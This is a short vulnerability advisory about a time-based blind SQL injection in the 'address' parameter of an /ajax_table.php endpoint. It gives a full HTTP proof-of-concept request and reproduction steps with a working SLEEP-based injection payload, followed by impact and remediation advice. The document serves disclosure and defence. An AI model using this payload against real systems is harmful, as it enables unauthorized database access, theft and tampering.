# Time-Based Blind SQL Injection in `address` Parameter

## Description
The `address` parameter in the **Address > Update** endpoint is vulnerable to SQL injection. Attackers can trigger time delays to confirm injection and potentially extract data.

## Proof of Concept
```
POST /ajax_table.php HTTP/1.1
Host: demo.target.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc
```

## Expected Behavior
If vulnerable, the response is delayed (e.g., ~5–7 seconds), confirming execution of the injected SQL.

## Steps to Reproduce
1. Navigate to **Address > Update**.
2. Intercept the request in Burp Suite.
3. Inject:
   ```
   'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
   ```
4. Observe delayed response.

## Impact
Attackers can:
- Extract sensitive DB data
- Modify or delete records
- Execute arbitrary SQL

## Recommendation
- Use parameterized queries (prepared statements).
- Validate and sanitize all input.
- Apply least-privilege DB credentials.
